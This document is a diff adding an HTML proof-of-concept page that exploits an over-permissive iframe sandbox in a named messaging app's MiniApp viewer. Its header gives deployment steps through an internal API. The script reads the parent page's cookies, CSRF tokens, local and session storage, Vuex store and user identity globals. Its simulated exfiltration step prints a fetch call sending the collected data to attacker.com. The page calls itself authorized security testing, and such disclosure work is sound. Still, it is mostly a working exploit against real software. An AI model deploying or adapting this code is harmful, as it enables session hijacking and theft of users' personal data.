@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MiniApp — Sandbox Escape PoC</title>
+    <!--
+    ============================================================================
+    XSS-BIZ-02 — MiniApp iframe Sandbox Escape PoC
+    ============================================================================
+    
+    VULNERABILITY:
+    MiniAppViewer.vue loads miniapp URLs in an iframe with:
+        sandbox="allow-same-origin allow-scripts allow-popups allow-forms"
+    
+    The combination of allow-same-origin + allow-scripts completely negates
+    the sandbox. The iframe content runs with the SAME origin as the parent,
+    giving it full access to:
+        - parent.document.cookie
+        - parent.document.querySelector(...)
+        - parent.localStorage / parent.sessionStorage
+        - parent.window (full DOM access)
+    
+    AFFECTED CODE:
+    MiniAppViewer.vue line 66-77:
+        <iframe
+            v-for="miniApp in openMiniApps"
+            :key="miniApp.id"
+            :ref="'iframe_' + miniApp.id"
+            v-show="activeMiniApp && activeMiniApp.id === miniApp.id && isContentVisible"
+            :src="miniApp.url"
+            class="art-miniapp-iframe zh-wh100"
+            frameborder="0"
+            allowfullscreen
+            sandbox="allow-same-origin allow-scripts allow-popups allow-forms"
+            @load="handleIframeLoad(miniApp.id)"
+        ></iframe>
+    
+    PREREQUISITE:
+    1. Attacker has business admin access (or compromised a business account)
+    2. Attacker creates a miniapp with targetUrl pointing to this PoC page
+    3. The PoC page is hosted on ANY domain (GitHub Pages, attacker server, etc.)
+    4. Because sandbox has allow-same-origin, the iframe is treated as same-origin
+       with the parent Arattai page
+    
+    EXPLOITATION STEPS:
+    1. Host this file on GitHub Pages (e.g., https://<user>.github.io/arattai-poc/)
+    2. Create miniapp via AFB API:
+       POST /internal/v1/users/me/miniapps
+       { "name": "Legit App", "targetUrl": "https://<user>.github.io/arattai-poc/" }
+    3. Publish the miniapp
+    4. When any user opens the miniapp, this page loads in the iframe
+    5. The PoC demonstrates cookie theft, DOM access, and session hijack
+    
+    NOTE: This is for authorized security testing only.
+    ============================================================================
+    -->
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .poc-header {
+            background: linear-gradient(135deg, #161b22, #1c2333);
+            border: 1px solid #f85149;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .poc-header h1 {
+            color: #f85149;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        .poc-header .severity {
+            display: inline-block;
+            background: #f85149;
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .poc-header p {
+            margin-top: 8px;
+            font-size: 13px;
+            color: #8b949e;
+        }
+        .section {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        .section h2 {
+            color: #58a6ff;
+            font-size: 14px;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #21262d;
+        }
+        .result-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 12px;
+            font-family: 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-bottom: 8px;
+        }
+        .success { border-color: #f85149; color: #f85149; }
+        .info { border-color: #58a6ff; color: #58a6ff; }
+        .warning { border-color: #d29922; color: #d29922; }
+        .safe { border-color: #3fb950; color: #3fb950; }
+        .btn {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            background: #21262d;
+            color: #c9d1d9;
+            cursor: pointer;
+            font-size: 13px;
+            margin-right: 8px;
+            margin-bottom: 8px;
+            transition: all 0.2s;
+        }
+        .btn:hover { background: #30363d; border-color: #58a6ff; }
+        .btn-danger { border-color: #f85149; }
+        .btn-danger:hover { background: #f8514920; }
+        .label {
+            font-size: 11px;
+            color: #8b949e;
+            margin-bottom: 4px;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        .status-red { background: #f85149; }
+        .status-green { background: #3fb950; }
+        .status-yellow { background: #d29922; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+        }
+        table td, table th {
+            padding: 6px 10px;
+            border: 1px solid #21262d;
+            text-align: left;
+        }
+        table th { background: #0d1117; color: #58a6ff; }
+        #exfil-log { min-height: 60px; }
+    </style>
+</head>
+<body>
+
+<div class="poc-header">
+    <span class="severity">CRITICAL</span>
+    <h1>🔓 XSS-BIZ-02 — MiniApp iframe Sandbox Escape</h1>
+    <p>This page demonstrates that <code>sandbox="allow-same-origin allow-scripts"</code> on the MiniApp iframe 
+    gives this page full access to the parent Arattai application's DOM, cookies, and session data.</p>
+</div>
+
+<!-- STEP 1: Environment Detection -->
+<div class="section">
+    <h2>Step 1 — Environment Detection</h2>
+    <div class="label">Iframe Context Check</div>
+    <div class="result-box" id="env-check">Running checks...</div>
+</div>
+
+<!-- STEP 2: Cookie Theft -->
+<div class="section">
+    <h2>Step 2 — Cookie Access (Session Theft)</h2>
+    <div class="label">Attempting to read parent document cookies</div>
+    <div class="result-box success" id="cookie-result">Waiting...</div>
+    <button class="btn btn-danger" onclick="stealCookies()">🍪 Read Parent Cookies</button>
+    <button class="btn" onclick="copyToClipboard('cookie-result')">📋 Copy</button>
+</div>
+
+<!-- STEP 3: DOM Access -->
+<div class="section">
+    <h2>Step 3 — Parent DOM Access</h2>
+    <div class="label">Reading parent page DOM elements</div>
+    <div class="result-box info" id="dom-result">Waiting...</div>
+    <button class="btn btn-danger" onclick="accessParentDOM()">🔍 Read Parent DOM</button>
+</div>
+
+<!-- STEP 4: LocalStorage / SessionStorage -->
+<div class="section">
+    <h2>Step 4 — Storage Access</h2>
+    <div class="label">Reading parent localStorage and sessionStorage</div>
+    <div class="result-box warning" id="storage-result">Waiting...</div>
+    <button class="btn btn-danger" onclick="accessStorage()">💾 Read Parent Storage</button>
+</div>
+
+<!-- STEP 5: User Data Extraction -->
+<div class="section">
+    <h2>Step 5 — User Identity Extraction</h2>
+    <div class="label">Extracting logged-in user info from parent context</div>
+    <div class="result-box success" id="user-result">Waiting...</div>
+    <button class="btn btn-danger" onclick="extractUserData()">👤 Extract User Data</button>
+</div>
+
+<!-- STEP 6: Simulated Exfiltration -->
+<div class="section">
+    <h2>Step 6 — Exfiltration Simulation</h2>
+    <div class="label">In a real attack, stolen data would be sent to attacker's server. This PoC only logs locally.</div>
+    <div class="result-box" id="exfil-log">No exfiltration attempted yet.</div>
+    <button class="btn btn-danger" onclick="simulateExfil()">📡 Simulate Exfil (Local Only)</button>
+</div>
+
+<!-- STEP 7: Impact Summary -->
+<div class="section">
+    <h2>Impact Summary</h2>
+    <table>
+        <tr><th>Attack Vector</th><th>Status</th><th>Impact</th></tr>
+        <tr><td>Cookie Theft</td><td id="impact-cookies"><span class="status-indicator status-yellow"></span>Not tested</td><td>Session hijack → Account takeover</td></tr>
+        <tr><td>DOM Manipulation</td><td id="impact-dom"><span class="status-indicator status-yellow"></span>Not tested</td><td>Phishing, UI injection, keylogging</td></tr>
+        <tr><td>Storage Access</td><td id="impact-storage"><span class="status-indicator status-yellow"></span>Not tested</td><td>Token theft, cached data leak</td></tr>
+        <tr><td>User Data</td><td id="impact-user"><span class="status-indicator status-yellow"></span>Not tested</td><td>PII exposure, identity theft</td></tr>
+    </table>
+</div>
+
+<script>
+    // =========================================================================
+    // PoC Logic — All exploitation happens through parent.* access
+    // =========================================================================
+
+    const collectedData = {};
+
+    // Step 1: Environment detection
+    function checkEnvironment() {
+        const el = document.getElementById('env-check');
+        const checks = [];
+
+        // Check if we're in an iframe
+        const isIframe = window !== window.top;
+        checks.push(`[${isIframe ? '✅' : '❌'}] Running inside iframe: ${isIframe}`);
+
+        // Check if we can access parent
+        let canAccessParent = false;
+        try {
+            const test = parent.document.title;
+            canAccessParent = true;
+            checks.push(`[✅] Can access parent.document: YES`);
+            checks.push(`[✅] Parent page title: "${test}"`);
+            checks.push(`[✅] Parent URL: ${parent.location.href}`);
+            checks.push(`[✅] Parent origin: ${parent.location.origin}`);
+        } catch (e) {
+            checks.push(`[❌] Cannot access parent.document: ${e.message}`);
+            checks.push(`[ℹ️] This means sandbox IS working correctly (cross-origin blocked)`);
+        }
+
+        // Check sandbox attributes
+        try {
+            const iframes = parent.document.querySelectorAll('iframe');
+            let ourSandbox = 'unknown';
+            iframes.forEach(iframe => {
+                if (iframe.contentWindow === window) {
+                    ourSandbox = iframe.getAttribute('sandbox') || 'none';
+                }
+            });
+            checks.push(`[ℹ️] Our iframe sandbox: "${ourSandbox}"`);
+        } catch(e) {
+            checks.push(`[ℹ️] Could not read own sandbox attribute`);
+        }
+
+        // Check what's available
+        checks.push(`\n--- Sandbox Capability Check ---`);
+        checks.push(`[${canAccessParent ? '🔓' : '🔒'}] Same-origin access: ${canAccessParent ? 'GRANTED (sandbox bypassed!)' : 'BLOCKED'}`);
+        
+        try { eval('1+1'); checks.push(`[🔓] Script execution: ALLOWED`); }
+        catch(e) { checks.push(`[🔒] Script execution: BLOCKED`); }
+
+        try { 
+            const w = window.open('', '_blank');
+            if (w) { w.close(); checks.push(`[🔓] Popup creation: ALLOWED`); }
+            else checks.push(`[🔒] Popup creation: BLOCKED by browser`);
+        } catch(e) { checks.push(`[🔒] Popup creation: BLOCKED`); }
+
+        el.textContent = checks.join('\n');
+    }
+
+    // Step 2: Cookie theft
+    function stealCookies() {
+        const el = document.getElementById('cookie-result');
+        const impact = document.getElementById('impact-cookies');
+        try {
+            // Access parent's cookies (this is the critical exploit)
+            const parentCookies = parent.document.cookie;
+            
+            if (parentCookies && parentCookies.length > 0) {
+                el.textContent = `[🔓 EXPLOITED] Parent cookies accessed!\n\n${parentCookies}`;
+                el.className = 'result-box success';
+                impact.innerHTML = '<span class="status-indicator status-red"></span>EXPLOITED ✅';
+                collectedData.cookies = parentCookies;
+            } else {
+                el.textContent = `[⚠️] parent.document.cookie returned empty string.\n\nThis could mean:\n- Cookies are httpOnly (cannot be read via JS)\n- No cookies set on this origin\n- The sandbox IS blocking access\n\nNote: Even with httpOnly cookies, DOM access still enables XSS attacks.`;
+                el.className = 'result-box warning';
+                impact.innerHTML = '<span class="status-indicator status-yellow"></span>Cookies httpOnly / empty';
+            }
+        } catch (e) {
+            el.textContent = `[🔒 BLOCKED] Cannot access parent cookies.\nError: ${e.message}\n\nSandbox is correctly blocking cross-origin access.`;
+            el.className = 'result-box safe';
+            impact.innerHTML = '<span class="status-indicator status-green"></span>BLOCKED (Safe)';
+        }
+    }
+
+    // Step 3: Parent DOM access
+    function accessParentDOM() {
+        const el = document.getElementById('dom-result');
+        const impact = document.getElementById('impact-dom');
+        try {
+            const parentDoc = parent.document;
+            const data = [];
+
+            data.push(`[🔓 EXPLOITED] Full parent DOM access!\n`);
+            data.push(`Page Title: ${parentDoc.title}`);
+            data.push(`URL: ${parent.location.href}`);
+            data.push(`Origin: ${parent.location.origin}`);
+            data.push(`Document Elements: ${parentDoc.querySelectorAll('*').length}`);
+            
+            // Try to find CSRF tokens
+            const metaTags = parentDoc.querySelectorAll('meta[name*="csrf"], meta[name*="token"], input[name*="csrf"], input[name*="token"]');
+            if (metaTags.length > 0) {
+                data.push(`\nCSRF/Token Elements Found: ${metaTags.length}`);
+                metaTags.forEach((tag, i) => {
+                    data.push(`  [${i}] <${tag.tagName.toLowerCase()} name="${tag.getAttribute('name')}" content/value="${tag.getAttribute('content') || tag.value || ''}">`);
+                });
+            }
+
+            // Try to find user info in Vue state
+            const appEl = parentDoc.querySelector('#app, [data-v-app]');
+            if (appEl && appEl.__vue_app__) {
+                data.push(`\n[🔓] Vue.js app instance found!`);
+                data.push(`[🔓] Vuex store accessible — can read all application state`);
+                try {
+                    const store = appEl.__vue_app__.config.globalProperties.$store;
+                    if (store) {
+                        data.push(`[🔓] Vuex store state keys: ${Object.keys(store.state).join(', ')}`);
+                        collectedData.vuexKeys = Object.keys(store.state);
+                    }
+                } catch(e) {
+                    data.push(`[ℹ️] Could not enumerate Vuex state: ${e.message}`);
+                }
+            } else {
+                data.push(`\n[ℹ️] Vue app root not found via #app or [data-v-app]`);
+            }
+
+            // Try to read visible text content
+            const chatMessages = parentDoc.querySelectorAll('[class*="message"], [class*="msg-"], [class*="chat-"]');
+            if (chatMessages.length > 0) {
+                data.push(`\n[🔓] Chat/Message elements found: ${chatMessages.length}`);
+                data.push(`[🔓] Can read all visible chat messages!`);
+            }
+
+            // Demonstrate DOM manipulation capability
+            data.push(`\n--- DOM Manipulation Capability ---`);
+            data.push(`[🔓] Can inject HTML into parent page`);
+            data.push(`[🔓] Can register keyloggers on parent inputs`);
+            data.push(`[🔓] Can modify UI to show phishing content`);
+            data.push(`[🔓] Can intercept form submissions`);
+
+            el.textContent = data.join('\n');
+            el.className = 'result-box success';
+            impact.innerHTML = '<span class="status-indicator status-red"></span>EXPLOITED ✅';
+            collectedData.dom = { title: parentDoc.title, url: parent.location.href, elements: parentDoc.querySelectorAll('*').length };
+
+        } catch (e) {
+            el.textContent = `[🔒 BLOCKED] Cannot access parent DOM.\nError: ${e.message}`;
+            el.className = 'result-box safe';
+            impact.innerHTML = '<span class="status-indicator status-green"></span>BLOCKED (Safe)';
+        }
+    }
+
+    // Step 4: Storage access
+    function accessStorage() {
+        const el = document.getElementById('storage-result');
+        const impact = document.getElementById('impact-storage');
+        try {
+            const data = [];
+            
+            // Access parent localStorage
+            const ls = parent.localStorage;
+            const lsKeys = Object.keys(ls);
+            data.push(`[🔓] Parent localStorage: ${lsKeys.length} keys`);
+            lsKeys.slice(0, 20).forEach(key => {
+                const val = ls.getItem(key);
+                const preview = val && val.length > 100 ? val.substring(0, 100) + '...' : val;
+                data.push(`  "${key}": ${preview}`);
+            });
+            if (lsKeys.length > 20) data.push(`  ... and ${lsKeys.length - 20} more keys`);
+
+            // Access parent sessionStorage
+            data.push('');
+            const ss = parent.sessionStorage;
+            const ssKeys = Object.keys(ss);
+            data.push(`[🔓] Parent sessionStorage: ${ssKeys.length} keys`);
+            ssKeys.slice(0, 10).forEach(key => {
+                const val = ss.getItem(key);
+                const preview = val && val.length > 100 ? val.substring(0, 100) + '...' : val;
+                data.push(`  "${key}": ${preview}`);
+            });
+            if (ssKeys.length > 10) data.push(`  ... and ${ssKeys.length - 10} more keys`);
+
+            el.textContent = data.join('\n');
+            el.className = 'result-box success';
+            impact.innerHTML = '<span class="status-indicator status-red"></span>EXPLOITED ✅';
+            collectedData.localStorage = lsKeys;
+            collectedData.sessionStorage = ssKeys;
+
+        } catch (e) {
+            el.textContent = `[🔒 BLOCKED] Cannot access parent storage.\nError: ${e.message}`;
+            el.className = 'result-box safe';
+            impact.innerHTML = '<span class="status-indicator status-green"></span>BLOCKED (Safe)';
+        }
+    }
+
+    // Step 5: User data extraction
+    function extractUserData() {
+        const el = document.getElementById('user-result');
+        const impact = document.getElementById('impact-user');
+        try {
+            const parentDoc = parent.document;
+            const data = [];
+            
+            data.push(`[🔓 EXPLOITED] Extracting user identity from parent...\n`);
+
+            // Method 1: Look for user data in global JS variables
+            const possibleGlobals = ['__USER__', '__ZUSER__', 'zc_user', 'LOGGED_IN_USER', 'currentUser', '_user'];
+            possibleGlobals.forEach(varName => {
+                try {
+                    const val = parent.window[varName];
+                    if (val) data.push(`[🔓] parent.${varName}: ${JSON.stringify(val).substring(0, 200)}`);
+                } catch(e) {}
+            });
+
+            // Method 2: Look for Zoho-specific globals
+            const zohoGlobals = ['$zcg', 'ZCGlobal', 'zcg', 'ZOHO'];
+            zohoGlobals.forEach(varName => {
+                try {
+                    const val = parent.window[varName];
+                    if (val) {
+                        data.push(`[🔓] parent.${varName} found!`);
+                        // Try to extract user-specific data
+                        if (val.ZUID) data.push(`  → ZUID: ${val.ZUID}`);
+                        if (val.userId) data.push(`  → userId: ${val.userId}`);
+                        if (val.userName) data.push(`  → userName: ${val.userName}`);
+                        if (val.email) data.push(`  → email: ${val.email}`);
+                        if (val.orgId) data.push(`  → orgId: ${val.orgId}`);
+                        if (val._AFB_WBEPAGE_LINK) data.push(`  → AFB link: ${val._AFB_WBEPAGE_LINK}`);
+                        // Dump all string/number properties
+                        Object.keys(val).forEach(k => {
+                            if (typeof val[k] === 'string' || typeof val[k] === 'number') {
+                                if (!['ZUID','userId','userName','email','orgId','_AFB_WBEPAGE_LINK'].includes(k)) {
+                                    data.push(`  → ${k}: ${String(val[k]).substring(0, 100)}`);
+                                }
+                            }
+                        });
+                        collectedData.globals = collectedData.globals || {};
+                        collectedData.globals[varName] = val;
+                    }
+                } catch(e) {}
+            });
+
+            // Method 3: Try to read from Vue/Vuex store
+            try {
+                const appEl = parentDoc.querySelector('#app, [data-v-app]');
+                if (appEl && appEl.__vue_app__) {
+                    const store = appEl.__vue_app__.config.globalProperties.$store;
+                    if (store) {
+                        // Try userstore
+                        if (store.state.userstore) {
+                            data.push(`\n[🔓] Vuex userstore found:`);
+                            const us = store.state.userstore;
+                            Object.keys(us).slice(0, 15).forEach(k => {
+                                const v = us[k];
+                                if (typeof v === 'string' || typeof v === 'number') {
+                                    data.push(`  → ${k}: ${String(v).substring(0, 100)}`);
+                                }
+                            });
+                            collectedData.userstore = us;
+                        }
+                    }
+                }
+            } catch(e) {
+                data.push(`\n[ℹ️] Vuex store read: ${e.message}`);
+            }
+
+            // Method 4: Meta tags
+            const metaUser = parentDoc.querySelector('meta[name*="user"], meta[name*="zuid"], meta[property*="user"]');
+            if (metaUser) {
+                data.push(`\n[🔓] User meta tag: ${metaUser.outerHTML}`);
+            }
+
+            if (data.length <= 2) {
+                data.push(`[ℹ️] No user data found in common locations — application may use different patterns.`);
+                data.push(`[ℹ️] However, full DOM access is confirmed — attacker can find and extract any visible data.`);
+            }
+
+            el.textContent = data.join('\n');
+            el.className = 'result-box success';
+            impact.innerHTML = '<span class="status-indicator status-red"></span>EXPLOITED ✅';
+
+        } catch (e) {
+            el.textContent = `[🔒 BLOCKED] Cannot extract user data.\nError: ${e.message}`;
+            el.className = 'result-box safe';
+            impact.innerHTML = '<span class="status-indicator status-green"></span>BLOCKED (Safe)';
+        }
+    }
+
+    // Step 6: Simulated exfiltration (LOCAL ONLY — no data leaves the browser)
+    function simulateExfil() {
+        const el = document.getElementById('exfil-log');
+        const payload = {
+            timestamp: new Date().toISOString(),
+            vulnerability: 'XSS-BIZ-02',
+            target: 'MiniApp iframe sandbox escape',
+            collected: {
+                cookies: collectedData.cookies ? `${collectedData.cookies.length} chars` : 'not collected',
+                dom: collectedData.dom || 'not collected',
+                localStorage: collectedData.localStorage ? `${collectedData.localStorage.length} keys` : 'not collected',
+                sessionStorage: collectedData.sessionStorage ? `${collectedData.sessionStorage.length} keys` : 'not collected',
+                globals: collectedData.globals ? Object.keys(collectedData.globals) : 'not collected'
+            }
+        };
+
+        const lines = [];
+        lines.push(`[📡 EXFILTRATION SIMULATION — LOCAL ONLY]\n`);
+        lines.push(`In a real attack, this data would be sent to:`);
+        lines.push(`  POST https://attacker.com/collect`);
+        lines.push(`  Content-Type: application/json`);
+        lines.push(`\nPayload that WOULD be sent:`);
+        lines.push(JSON.stringify(payload, null, 2));
+        lines.push(`\n[ℹ️] No data was actually exfiltrated — this is a simulation.`);
+        lines.push(`[ℹ️] Real exploit code would use: fetch('https://attacker.com/c', {method:'POST', body:JSON.stringify(payload)})`);
+
+        el.textContent = lines.join('\n');
+    }
+
+    // Utility: copy to clipboard
+    function copyToClipboard(elementId) {
+        const text = document.getElementById(elementId).textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            alert('Copied to clipboard!');
+        }).catch(() => {
+            // Fallback
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+        });
+    }
+
+    // Auto-run environment check on load
+    window.addEventListener('load', checkEnvironment);
+</script>
+</body>
+</html>
